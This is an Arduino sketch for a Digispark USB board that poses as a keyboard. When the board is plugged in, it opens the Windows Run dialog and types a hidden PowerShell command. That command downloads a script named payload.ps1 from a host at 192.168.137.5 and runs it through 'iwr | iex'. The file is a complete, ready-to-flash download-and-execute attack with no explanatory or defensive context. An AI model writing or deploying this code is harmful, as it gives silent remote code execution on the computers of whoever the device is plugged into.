#include "DigiKeyboard.h"

// Store the script URL in PROGMEM (flash) to save RAM
static const char scriptURL[] PROGMEM = "http://192.168.137.5:5000/download/payload.ps1";

void setup() {
  DigiKeyboard.delay(2000);

  // Open Run dialog (Win+R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Print the PowerShell command without storing large strings in RAM
  DigiKeyboard.print(F("powershell -WindowStyle Hidden -Command \"& { iwr "));
  
  // Print the URL from PROGMEM (character by character)
  for (int i = 0; i < strlen_P(scriptURL); i++) {
    DigiKeyboard.print((char)pgm_read_byte(&scriptURL[i]));
  }
  
  DigiKeyboard.print(F(" -UseBasicParsing | iex }\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
